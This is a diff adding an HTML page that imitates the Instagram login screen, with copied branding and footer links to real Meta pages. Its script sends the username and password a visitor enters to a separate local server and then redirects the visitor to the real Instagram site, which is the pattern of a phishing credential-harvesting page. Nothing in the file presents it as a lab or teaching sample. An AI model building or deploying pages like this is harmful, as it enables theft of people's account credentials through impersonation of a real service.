@@ -1,0 +1,124 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1384/1384063.png"/>
+</head>
+<body>
+  <main class="shell">
+    <section class="left">
+        <div class="ig-collage" aria-hidden="true">
+          <div class="card card-main"></div>
+          <div class="card card-left"></div>
+          <div class="card card-right"></div>
+      
+          <div class="sticker heart"></div>
+          <div class="sticker bubble">🔥 💧 💜</div>
+          <div class="sticker check">★</div>
+      
+          <div class="avatar-ring">
+            <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=240&q=80" alt="">
+          </div>
+        </div>
+      </section>
+      
+
+    <section class="right">
+      <div class="card login">
+        <h1 class="logo">Instagram</h1>
+
+        <form id="loginForm" class="form" autocomplete="off">
+          <input id="username" class="input" type="text" placeholder="Phone number, username, or email" required />
+          <input id="password" class="input" type="password" placeholder="Password" required />
+          <button id="loginBtn" class="btn" type="submit">Log in</button>
+
+          <div class="or">
+            <span class="line"></span>
+            <span class="text">OR</span>
+            <span class="line"></span>
+          </div>
+
+          <button type="button" class="fb">Log in with Facebook</button>
+          <a href="#" class="forgot">Forgot password?</a>
+        </form>
+      </div>
+
+      <div class="card signup">
+        <p>Don’t have an account? <a href="#">Sign up</a></p>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <nav class="links">
+      <a href="https://about.meta.com/">Meta</a>
+      <a href="https://about.instagram.com/">About</a>
+      <a href="https://about.meta.com/blog/">Blog</a>
+      <a href="https://about.meta.com/careers/">Jobs</a>
+      <a href="https://help.instagram.com/">Help</a>
+      <a href="https://developers.facebook.com/docs/instagram">API</a>
+      <a href="https://privacycenter.instagram.com/policy/">Privacy</a>
+      <a href="https://help.instagram.com/581066165581870">Terms</a>
+      <a href="https://www.instagram.com/explore/locations/">Locations</a>
+      <a href="https://www.instagram.com/lite/">Instagram Lite</a>
+      <a href="https://about.meta.com/technologies/meta-ai/">Meta AI</a>
+      <a href="https://about.meta.com/technologies/meta-ai/articles/">Meta AI Articles</a>
+      <a href="https://www.instagram.com/threads/">Threads</a>
+      <a href="https://www.facebook.com/help/contact/606967319425038">Contact Uploading & Non-Users</a>
+      <a href="https://www.instagram.com/meta_verified/">Meta Verified</a>
+    </nav>
+    <div class="meta">
+      <select class="lang" aria-label="Change Language">
+        <option selected>English</option>
+        <option>العربية</option>
+        <option>Français</option>
+        <option>Deutsch</option>
+        <option>Español</option>
+        <option>Türkçe</option>
+      </select>
+      <span>© 2025 Instagram from Meta</span>
+    </div>
+  </footer>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Logging in...';
+
+      const payload = {
+        username: document.getElementById('username').value.trim(),
+        password: document.getElementById('password').value
+      };
+
+      try {
+        const res = await fetch('http://localhost:3000/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) throw new Error('Network response was not ok');
+
+        const json = await res.json();
+
+        console.log('Server response:', json);
+
+        window.location.href = 'https://www.instagram.com/';
+
+      } catch (err) {
+        console.error('Login error:', err);
+        alert('There was an error processing the login (check console).');
+      } finally {
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Log In';
+      }
+    });
+  </script>
+</body>
+</html>
